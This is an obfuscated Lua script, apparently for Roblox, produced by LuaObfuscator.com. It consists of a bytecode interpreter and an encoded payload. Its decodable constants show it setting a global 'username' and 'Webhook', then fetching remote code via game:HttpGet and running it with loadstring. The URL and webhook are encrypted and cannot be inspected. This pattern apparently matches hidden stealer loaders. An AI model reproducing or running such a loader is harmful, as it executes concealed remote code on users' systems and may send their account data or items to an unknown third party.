 local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25) local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function() return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...) local v29=1;local v30;v27=v12(v11(v27,5),v7("\67\133","\168\109\171\165\195\183\177\134"),function(v42) if (v9(v42,2)==81) then local v92=0;while true do if (v92==0) then v30=v8(v11(v42,1,1));return "";end end else local v93=0;local v94;while true do if (v93==0) then v94=v10(v8(v42,16));if v30 then local v122=0;local v123;while true do if (v122==0) then v123=v13(v94,v30);v30=nil;v122=1;end if (1==v122) then return v123;end end else return v94;end break;end end end end);local function v31(v43,v44,v45) if v45 then local v95=0;local v96;while true do if (v95==0) then v96=(v43/(2^(v44-1)))%(2^(((v45-1) -(v44-1)) + 1)) ;return v96-(v96%(2 -1)) ;end end else local v97=0;local v98;while true do if (v97==0) then v98=2^(v44-(2 -1)) ;return (((v43%(v98 + v98))>=v98) and 1) or (0 -0) ;end end end end local function v32() local v46=0;local v47;while true do if (v46==1) then return v47;end if (v46==0) then v47=v9(v27,v29,v29);v29=v29 + 1 ;v46=1;end end end local function v33() local v48,v49=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;return (v49 * 256) + v48 ;end local function v34() local v50=0;local v51;local v52;local v53;local v54;while true do if (v50==1) then return (v54 * 16777216) + (v53 * 65536) + (v52 * 256) + v51 ;end if (v50==0) then v51,v52,v53,v54=v9(v27,v29,v29 + (7 -4) );v29=v29 + 4 ;v50=1;end end end local function v35() local v55=v34();local v56=v34();local v57=620 -(555 + 64) ;local v58=(v31(v56,1,20) * (2^(963 -(857 + 74)))) + v55 ;local v59=v31(v56,21,31);local v60=((v31(v56,32)==1) and  -(569 -(367 + 201))) or 1 ;if (v59==0) then if (v58==0) then return v60 * 0 ;else v59=1;v57=0;end elseif (v59==(2974 -(214 + 713))) then return ((v58==0) and (v60 * (1/0))) or (v60 * NaN) ;end return v16(v60,v59-1023 ) * (v57 + (v58/((1 + 1)^52))) ;end local function v36(v61) local v62=0;local v63;local v64;while true do if (v62==0) then v63=nil;if  not v61 then v61=v34();if (v61==(0 + 0)) then return "";end end v62=1;end if (v62==1) then v63=v11(v27,v29,(v29 + v61) -(878 -(282 + 595)) );v29=v29 + v61 ;v62=2;end if (v62==2) then v64={};for v102=1, #v63 do v64[v102]=v10(v9(v11(v63,v102,v102)));end v62=3;end if (3==v62) then return v14(v64);end end end local v37=v34;local function v38(...) return {...},v20("#",...);end local function v39() local v65=0;local v66;local v67;local v68;local v69;local v70;local v71;while true do if (v65==2) then for v104=1,v34() do local v105=v32();if (v31(v105,1,1)==0) then local v118=v31(v105,2,3 + 0 );local v119=v31(v105,4,6);local v120={v33(),v33(),nil,nil};if (v118==0) then local v125=0;while true do if (v125==0) then v120[3]=v33();v120[1069 -(68 + 997) ]=v33();break;end end elseif (v118==(1271 -(226 + 1044))) then v120[3]=v34();elseif (v118==2) then v120[3]=v34() -(2^16) ;elseif (v118==3) then v120[3]=v34() -(2^16) ;v120[4]=v33();end if (v31(v119,1,1)==1) then v120[2]=v71[v120[2]];end if (v31(v119,2,2)==(4 -3)) then v120[3]=v71[v120[3]];end if (v31(v119,3,3)==1) then v120[4]=v71[v120[121 -(32 + 85) ]];end v66[v104]=v120;end end for v106=1,v34() do v67[v106-1 ]=v39();end return v69;end if (1==v65) then v70=v34();v71={};for v108=1,v70 do local v109=0;local v110;local v111;while true do if (v109==0) then v110=v32();v111=nil;v109=1;end if (v109==1) then if (v110==1) then v111=v32()~=0 ;elseif (v110==2) then v111=v35();elseif (v110==3) then v111=v36();end v71[v108]=v111;break;end end end v69[3]=v32();v65=2;end if (v65==0) then v66={};v67={};v68={};v69={v66,v67,nil,v68};v65=1;end end end local function v40(v72,v73,v74) local v75=v72[1];local v76=v72[2];local v77=v72[3];return function(...) local v78=v75;local v79=v76;local v80=v77;local v81=v38;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v20("#",...) -1 ;local v87={};local v88={};for v99=0,v86 do if (v99>=v80) then v84[v99-v80 ]=v85[v99 + 1 ];else v88[v99]=v85[v99 + 1 ];end end local v89=(v86-v80) + 1 + 0 ;local v90;local v91;while true do local v100=0;while true do if (1==v100) then if (v91<=32) then if (v91<=15) then if (v91<=7) then if (v91<=3) then if (v91<=1) then if (v91>0) then do return;end else local v138=0;local v139;while true do if (v138==0) then v139=v90[2];v88[v139]=v88[v139](v21(v88,v139 + 1 ,v90[3]));break;end end end elseif (v91==2) then local v140=v90[2];do return v88[v140](v21(v88,v140 + 1 ,v90[3]));end else v88[v90[2]]={};end elseif (v91<=5) then if (v91==4) then for v248=v90[2],v90[3] do v88[v248]=nil;end else v88[v90[2]]=v88[v90[3]] + v90[4] ;end elseif (v91>6) then local v143=v90[2];local v144,v145=v81(v88[v143](v21(v88,v143 + 1 ,v90[3])));v83=(v145 + v143) -1 ;local v146=0;for v250=v143,v83 do local v251=0;while true do if (v251==0) then v146=v146 + 1 ;v88[v250]=v144[v146];break;end end end elseif (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end elseif (v91<=11) then if (v91<=9) then if (v91==8) then v88[v90[2]]=v74[v90[1 + 2 ]];else local v149=v90[2];v88[v149]=v88[v149](v21(v88,v149 + 1 ,v83));end elseif (v91==10) then v88[v90[2]][v90[3]]=v88[v90[961 -(892 + 65) ]];else v82=v90[3];end elseif (v91<=13) then if (v91==12) then v88[v90[2]]();else v88[v90[4 -2 ]]=v88[v90[3]]%v90[4] ;end elseif (v91==14) then if (v88[v90[2]]==v90[6 -2 ]) then v82=v82 + 1 ;else v82=v90[3];end elseif v88[v90[2]] then v82=v82 + 1 ;else v82=v90[3];end elseif (v91<=23) then if (v91<=19) then if (v91<=(31 -14)) then if (v91>16) then local v155=v90[2];local v156,v157=v81(v88[v155](v21(v88,v155 + 1 ,v83)));v83=(v157 + v155) -1 ;local v158=0;for v252=v155,v83 do v158=v158 + (351 -(87 + 263)) ;v88[v252]=v156[v158];end else v88[v90[2]]=v88[v90[3]][v90[4]];end elseif (v91==18) then local v161=v90[2];v88[v161]=v88[v161](v21(v88,v161 + (181 -(67 + 113)) ,v90[3]));else v88[v90[2 + 0 ]]= #v88[v90[3]];end elseif (v91<=21) then if (v91==(49 -29)) then local v164=v90[2];local v165=v88[v164];for v255=v164 + 1 ,v83 do v15(v165,v88[v255]);end else local v166=v90[2];local v167=v88[v166 + 2 ];local v168=v88[v166] + v167 ;v88[v166]=v168;if (v167>0) then if (v168<=v88[v166 + 1 + 0 ]) then local v299=0;while true do if (0==v299) then v82=v90[3];v88[v166 + 3 ]=v168;break;end end end elseif (v168>=v88[v166 + 1 ]) then local v300=0;while true do if (v300==0) then v82=v90[3];v88[v166 + 3 ]=v168;break;end end end end elseif (v91==(87 -65)) then local v170=v90[2];local v171=v88[v170];local v172=v88[v170 + 2 ];if (v172>0) then if (v171>v88[v170 + 1 ]) then v82=v90[3];else v88[v170 + 3 ]=v171;end elseif (v171<v88[v170 + 1 ]) then v82=v90[3];else v88[v170 + 3 ]=v171;end else local v173=0;local v174;local v175;local v176;while true do if (v173==0) then v174=v90[2];v175=v88[v174 + 2 ];v173=1;end if (v173==2) then if (v175>0) then if (v176<=v88[v174 + 1 ]) then local v341=0;while true do if (v341==0) then v82=v90[3];v88[v174 + 3 ]=v176;break;end end end elseif (v176>=v88[v174 + 1 ]) then v82=v90[3];v88[v174 + 3 ]=v176;end break;end if (1==v173) then v176=v88[v174] + v175 ;v88[v174]=v176;v173=2;end end end elseif (v91<=27) then if (v91<=25) then if (v91>24) then v88[v90[2]]=v88[v90[3]];else local v179=v90[2];local v180=v88[v90[3]];v88[v179 + 1 ]=v180;v88[v179]=v180[v90[4]];end elseif (v91==26) then do return v88[v90[2]]();end elseif v88[v90[954 -(802 + 150) ]] then v82=v82 + (2 -1) ;else v82=v90[3];end elseif (v91<=(52 -23)) then if (v91>(21 + 7)) then v88[v90[2]][v90[3]]=v88[v90[4]];else local v186=0;local v187;while true do if (0==v186) then v187=v90[2];v88[v187]=v88[v187](v21(v88,v187 + 1 ,v83));break;end end end elseif (v91<=30) then v82=v90[3];elseif (v91>31) then v88[v90[2]]={};else v88[v90[2]]=v88[v90[3]];end elseif (v91<=48) then if (v91<=40) then if (v91<=(1033 -(915 + 82))) then if (v91<=34) then if (v91>(93 -60)) then v88[v90[2]]=v88[v90[3]]%v88[v90[4]] ;else v88[v90[2]]=v88[v90[3]]%v88[v90[4]] ;end elseif (v91>35) then v88[v90[2]]=v90[3] + v88[v90[4]] ;else local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v83=(v195 + v193) -1 ;v196=0;v192=2;end if (v192==0) then v193=v90[2];v194,v195=v81(v88[v193](v21(v88,v193 + 1 + 0 ,v90[3])));v192=1;end if (v192==2) then for v305=v193,v83 do local v306=0;while true do if (v306==0) then v196=v196 + 1 ;v88[v305]=v194[v196];break;end end end break;end end end elseif (v91<=38) then if (v91==37) then local v197=v90[2];local v198,v199=v81(v88[v197](v21(v88,v197 + 1 ,v83)));v83=(v199 + v197) -1 ;local v200=0;for v256=v197,v83 do local v257=0;while true do if (v257==0) then v200=v200 + 1 ;v88[v256]=v198[v200];break;end end end else do return v88[v90[2]]();end end elseif (v91==39) then local v201=v90[2];local v202,v203=v81(v88[v201](v88[v201 + 1 ]));v83=(v203 + v201) -1 ;local v204=0 -0 ;for v258=v201,v83 do local v259=0;while true do if (0==v259) then v204=v204 + 1 ;v88[v258]=v202[v204];break;end end end else v88[v90[2]]= #v88[v90[3]];end elseif (v91<=44) then if (v91<=42) then if (v91==41) then v88[v90[2]]=v74[v90[3]];else v88[v90[2]]=v88[v90[1190 -(1069 + 118) ]][v90[8 -4 ]];end elseif (v91>43) then local v210=0;local v211;while true do if (v210==0) then v211=v90[2];v88[v211](v21(v88,v211 + 1 ,v83));break;end end else local v212=v90[3 -1 ];local v213,v214=v81(v88[v212](v88[v212 + 1 ]));v83=(v214 + v212) -1 ;local v215=0;for v260=v212,v83 do local v261=0;while true do if (v261==0) then v215=v215 + 1 ;v88[v260]=v213[v215];break;end end end end elseif (v91<=46) then if (v91>45) then v88[v90[2]]=v88[v90[3]] + v90[4] ;else v88[v90[2]]();end elseif (v91==(9 + 38)) then v88[v90[3 -1 ]]=v90[3];else v88[v90[2]]=v90[3] + v88[v90[4]] ;end elseif (v91<=(56 + 0)) then if (v91<=(843 -(368 + 423))) then if (v91<=50) then if (v91>49) then local v220=0;local v221;local v222;local v223;while true do if (0==v220) then v221=v90[2];v222=v88[v221];v220=1;end if (1==v220) then v223=v88[v221 + 2 ];if (v223>0) then if (v222>v88[v221 + (3 -2) ]) then v82=v90[3];else v88[v221 + (21 -(10 + 8)) ]=v222;end elseif (v222<v88[v221 + 1 ]) then v82=v90[3];else v88[v221 + 3 ]=v222;end break;end end else v88[v90[2]]=v90[3];end elseif (v91==51) then v88[v90[2]]=v73[v90[3]];else local v228=0;local v229;local v230;while true do if (v228==0) then v229=v90[2];v230=v88[v90[3]];v228=1;end if (v228==1) then v88[v229 + (3 -2) ]=v230;v88[v229]=v230[v90[4]];break;end end end elseif (v91<=54) then if (v91==53) then if  not v88[v90[2]] then v82=v82 + 1 ;else v82=v90[3];end else v88[v90[2]]=v88[v90[3]]%v90[4] ;end elseif (v91==55) then local v232=0;local v233;while true do if (v232==0) then v233=v90[2];do return v21(v88,v233,v83);end break;end end elseif  not v88[v90[2]] then v82=v82 + 1 ;else v82=v90[3];end elseif (v91<=60) then if (v91<=58) then if (v91==(499 -(416 + 26))) then local v234=v90[2];v88[v234](v21(v88,v234 + 1 ,v83));else local v235=0;local v236;local v237;local v238;while true do if (1==v235) then v238={};v237=v18({},{[v7("\8\231\215\26\92\50\192","\56\87\184\190\116")]=function(v313,v314) local v315=v238[v314];return v315[1][v315[2]];end,[v7("\3\14\7\190\14\226\47\49\57\41","\85\92\81\105\219\121\139\65")]=function(v316,v317,v318) local v319=0;local v320;while true do if (v319==0) then v320=v238[v317];v320[3 -2 ][v320[2]]=v318;break;end end end});v235=2;end if (v235==2) then for v321=1,v90[2 + 2 ] do v82=v82 + 1 ;local v322=v78[v82];if (v322[1]==31) then v238[v321-1 ]={v88,v322[3]};else v238[v321-1 ]={v73,v322[3]};end v87[ #v87 + 1 ]=v238;end v88[v90[2]]=v40(v236,v237,v74);break;end if (v235==0) then v236=v79[v90[3]];v237=nil;v235=1;end end end elseif (v91==59) then v88[v90[2]]=v73[v90[441 -(145 + 293) ]];else local v241=v90[2];do return v88[v241](v21(v88,v241 + 1 ,v90[3]));end end elseif (v91<=62) then if (v91>61) then local v242=v90[2];local v243=v88[v242];for v262=v242 + 1 ,v83 do v15(v243,v88[v262]);end else local v244=0;local v245;local v246;local v247;while true do if (v244==1) then v247={};v246=v18({},{[v7("\194\140\89\75\120\218\229","\191\157\211\48\37\28")]=function(v324,v325) local v326=v247[v325];return v326[1487 -(998 + 488) ][v326[2]];end,[v7("\224\32\250\25\45\214\17\240\25\34","\90\191\127\148\124")]=function(v327,v328,v329) local v330=0;local v331;while true do if (v330==0) then v331=v247[v328];v331[1][v331[2]]=v329;break;end end end});v244=2;end if (v244==2) then for v332=1,v90[4] do local v333=0;local v334;while true do if (v333==0) then v82=v82 + 1 ;v334=v78[v82];v333=1;end if (v333==1) then if (v334[1]==31) then v247[v332-1 ]={v88,v334[3]};else v247[v332-1 ]={v73,v334[3]};end v87[ #v87 + 1 ]=v247;break;end end end v88[v90[2]]=v40(v245,v246,v74);break;end if (0==v244) then v245=v79[v90[433 -(44 + 386) ]];v246=nil;v244=1;end end end elseif (v91<=63) then do return;end elseif (v91==(836 -(201 + 571))) then local v272=v90[2];do return v21(v88,v272,v83);end else for v295=v90[2],v90[3] do v88[v295]=nil;end end v82=v82 + 1 ;break;end if (v100==0) then v90=v78[v82];v91=v90[1];v100=1;end end end end;end return v40(v39(),{},v28)(...);end return v23("LOL!0D3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E7365727403053Q006D6174636803083Q00746F6E756D62657203053Q007063612Q6C00243Q0012293Q00013Q0020105Q0002001229000100013Q002010000100010003001229000200013Q002010000200020004001229000300053Q0006380003000A0001000100040B3Q000A0001001229000300063Q002010000400030007001229000500083Q002010000500050009001229000600083Q00201000060006000A00063A00073Q000100062Q001F3Q00064Q001F8Q001F3Q00044Q001F3Q00014Q001F3Q00024Q001F3Q00053Q001229000800013Q00201000080008000B0012290009000C3Q001229000A000D3Q00063A000B0001000100052Q001F3Q00074Q001F3Q00094Q001F3Q00084Q001F3Q000A4Q001F3Q000B4Q0019000C000B4Q0026000C00014Q0040000C6Q003F3Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q002000025Q001231000300014Q002800045Q001231000500013Q0004160003002100012Q003B00076Q0019000800024Q003B000900014Q003B000A00024Q003B000B00034Q003B000C00044Q0019000D6Q0019000E00063Q002005000F000600012Q0007000C000F4Q001C000B3Q00022Q003B000C00034Q003B000D00044Q0019000E00014Q0028000F00014Q0021000F0006000F001024000F0001000F2Q0028001000014Q00210010000600100010240010000100100020050010001000012Q0007000D00104Q0011000C6Q001C000A3Q0002002036000A000A00022Q002B0009000A4Q003900073Q00010004170003000500012Q003B000300054Q0019000400024Q0002000300044Q004000036Q003F3Q00017Q00043Q00027Q004003053Q003A25642B3A2Q033Q0025642B026Q00F03F001C3Q00063A5Q000100012Q00338Q003B000100014Q003B000200024Q003B000300024Q002000046Q003B000500034Q001900066Q0041000700074Q0007000500074Q003E00043Q0001002010000400040001001231000500024Q0012000300050002001231000400034Q0007000200044Q001C00013Q0002002606000100180001000400040B3Q001800012Q001900016Q002000026Q0002000100024Q004000015Q00040B3Q001B00012Q003B000100044Q0026000100014Q004000016Q003F3Q00013Q00013Q000D3Q0003023Q005F4703083Q00757365726E616D6503073Q00FCCCD01ABEE29203083Q007EB1A3BB4586DBA703073Q00576562682Q6F6B03793Q002BD93ED5EF798265C1F530CE25D7F86DCE25C8B322DD238AEB26CF22CAF328DE6594AE7B987391AD72957D95AA779C7A92AC719565D0E937952EC4DB2CE47DE8CD11E002C1A531D97AE9F232FF3BEAA507CA0BC3D471E632EDCA07F47CE2DE34D81BC7A90AC53EE4FE75FA01F4C635E30DC0EC14DF00CEAF0C03053Q009C43AD4AA5030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034D3Q003CA35D06AF7C097BA54801F2214F20BF5C14A9354326B44618A8234820F94A19B1695031A45D0FA4697607EE1059B1274F3AF87913A8154F39A24517A829546DEE6803A8296035A54458B0334703073Q002654D72976DC46026Q00F03F011B3Q00060F3Q001900013Q00040B3Q00190001001229000100014Q003B00025Q001231000300033Q001231000400044Q001200020004000200101D000100020002001229000100014Q003B00025Q001231000300063Q001231000400074Q001200020004000200101D000100050002001229000100083Q001229000200093Q00203400020002000A2Q003B00045Q0012310005000B3Q0012310006000C4Q0007000400064Q001100026Q001C00013Q00022Q002D00010001000100040B3Q001A000100201000013Q000D2Q003F3Q00017Q00",v17(),...);
-- âš ï¸ WARNING: integrity protected!
--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--
